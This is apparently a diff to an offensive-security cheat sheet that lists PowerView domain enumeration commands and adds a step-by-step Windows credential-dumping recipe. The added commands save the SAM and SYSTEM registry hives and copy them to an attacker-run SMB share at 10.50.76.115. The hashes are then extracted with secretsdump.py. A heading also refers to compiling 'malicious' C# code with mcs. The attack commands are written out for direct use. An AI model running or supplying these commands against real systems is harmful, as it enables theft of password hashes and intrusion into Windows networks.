@@ -207,6 +207,7 @@ Get-DomainForeignUser               -   enumerates users who are in groups outsi
 Get-DomainForeignGroupMember        -   enumerates groups with users outside of the group's domain and returns each foreign member
 Get-DomainTrustMapping              -   this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds
 ```
+
 # Malicious .cs code and make it executable using `MCS`
 ```cs
 # Make a file named exploit.cs
@@ -229,4 +230,24 @@ namespace exploit{
 # Compile code using mcs cmd to make an executable binary.
 
 └─$ mcs exploit.cs 
+```
+# Dump credentials on Windows machine.
+```powershell
+# On target windows machine
+reg.exe save HKLM\SYSTEM system.bak
+reg.exe save HKLM\SAM sam.bak
+
+
+# On attacking machine
+└─$ smbserver.py s . -smb2support -username user -password password
+
+# On Windows target machine
+net use \\10.50.76.115\s /USER:user password
+
+move sam.bak \\10.50.76.115\s\sam.bak
+move system.bak \\10.50.76.115\s\system.bak
+
+
+# On attacking machine
+└─$ secretsdump.py -sam sam.bak -system system.bak LOCAL
 ```
